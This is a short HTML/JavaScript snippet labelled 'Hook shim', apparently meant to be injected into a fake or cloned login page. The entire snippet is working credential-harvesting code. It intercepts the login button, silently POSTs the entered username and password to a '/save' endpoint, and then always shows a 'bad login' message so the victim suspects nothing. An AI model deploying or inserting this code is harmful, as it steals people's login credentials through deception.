<!-- START: Hook shim -->
<script src="https://code.jquery.com/jquery-3.2.1.min.js"
integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
crossorigin="anonymous">
</script>

<script type="text/javascript">
//<![CDATA[
$('#BadLogin').hide();
$('#LoginButton' ).click(function( event ) {
  event.preventDefault();

     $.ajax({
         url: '/save',
         data: [$('#UserName').serialize(),$('#Password').serialize()].join('&'),
         contentType: "application/x-www-form-urlencoded",
         type: 'POST',
         success: function(response) {
             $('#BadLogin').show();
             $('#BadLogin').css("visibility", "visible");
         },
         error: function(error) {
             $('#BadLogin').show();
             $('#BadLogin').css("visibility", "visible");
         }
     });
     return true;
 });
//]]>
</script> <!-- END: Hook shim -->
